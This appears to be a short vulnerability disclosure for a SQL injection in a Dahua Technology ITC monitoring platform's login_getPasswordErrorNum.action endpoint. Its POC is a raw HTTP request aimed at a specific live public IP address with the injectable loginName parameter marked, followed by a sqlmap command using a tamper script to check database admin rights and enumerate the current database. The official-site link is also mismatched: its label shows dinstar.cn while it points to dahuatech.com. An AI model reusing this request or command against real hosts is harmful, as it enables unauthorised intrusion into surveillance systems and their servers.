Zhejiang Dahua Technology Co., Ltd. is a leading supplier of monitoring products and solution services, providing a series of leading products such as video storage, front-end, display control, and intelligent transportation worldwide, as well as providing thermal imaging temperature measurement and blackbody temperature measurement equipment.

There is a SQL injection vulnerability in the monitoring platform of Zhejiang Dahua Technology Co., Ltd. Attackers can exploit vulnerabilities to gain server privileges.

official：[https://www.dinstar.cn/](https://www.dahuatech.com/)

version:1.0

 Vulnerability Path  ：/itc/$%7BappPath%7D/login_getPasswordErrorNum.action

url：http://61.178.24.128/itc/login_init.action

<img width="654" height="403" alt="图片" src="https://github.com/user-attachments/assets/d22842fd-a3c4-4615-be49-20123ed0087c" />
POC：

```
GET http://61.178.24.128/itc/$%7BappPath%7D/login_getPasswordErrorNum.action?userBean.loginName=admin*&userBean.loginPass=123456&_=1693797717346 HTTP/1.1
Host: 61.178.24.128
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/plain, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://61.178.24.128/itc/login_init.action
Cookie: JSESSIONID=390F205CE333AA95969E777A02F65C1F; JSESSIONID=2CDD78986FC307DBD19FC0901810553C
```

python3 sqlmap.py -r 1.txt  --batch --tamper=space2comment --is-dba --current-db

<img width="642" height="479" alt="图片" src="https://github.com/user-attachments/assets/654a6d8c-3c21-4f10-8889-3876dfe04c25" />
